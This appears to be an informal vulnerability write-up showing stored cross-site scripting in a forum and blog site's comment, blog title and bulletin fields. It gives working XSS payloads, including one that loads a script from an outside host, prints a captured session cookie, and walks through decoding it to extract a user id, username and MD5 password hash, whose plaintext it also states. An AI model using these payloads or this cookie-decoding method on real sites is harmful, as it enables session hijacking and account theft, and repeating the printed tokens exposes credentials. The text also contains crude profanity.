XSS vuln with cookie disclosure via posting a comment:

Since there a vulnerability in bbcode 1.23.1 and below, we can execute our XSS example and display the cookie info by putting the following in as a comment:

[img]javascript:alert(document.cookie)[/img]

This also works when creating a new blog entry too. Just put the above codeinasyour"entry title" or "entry subject"

Our Cookie:

TIME=1150153432; switchmenu; apnaforum_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A32%3A%2291da4589b012c2fe1ceac1fb2363dbc6%22%3Bs%3A6%3A%22userid%22%3Bs%3A4%3A%223462%22%3B%7D; apnaforum_sid=2964cbd2c5a3f3d1a911fbf777c32300; NATIO=luny666;__utma=265362911.794893539.1150148238.1150148238.1150151884.2; __utmc=265362911; __utmz=265362911.1150148238.1.1.utmccn=(referral|utmcsr=dmoz.org|utmcct=/Recreation/Picture_Ratings/|utmcmd=referral; __utmb=265362911


The cookie looks pretty much the same as a few of the others I've discussed. I'll just post whats needed:

Dcoding the Hex value of:

apnaforum_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A32%3A%2291da4589b012c2fe1ceac1fb2363dbc6%22%3Bs%3A6%3A%22userid%22%3Bs%3A4%3A%223462%22%3B%7D;

We get:

a:2:{s:11:"autologinid";s:32:"91da4589b012c2fe1ceac1fb2363dbc6";s:6:"userid";s:4:"3462";}

What we need:

91da4589b012c2fe1ceac1fb2363dbc6 (Our md5 hashed password, which is fuckit)

Our userid is:3462

Now lets godown to NATIO=luny666 (This is our username)

Congrats, you now know the md5 hashed pw, which can be cracked, as well as our username from this cookie. Lets move on to other parts of the site that suffer from XSS vulns.

Posting a bulletin XSS vuln:

When postinga bulletin, userinput is not sanatized and filtered before being generated. So, unlike above, where we had to use the sites standard bbcode tags,  we can just use normal html tags here. For PoC when submitting a bulletin, try putting <SCRIPT SRC=http://youfucktard.com/xss.js></SCRIPT> in as your bulletin subject.
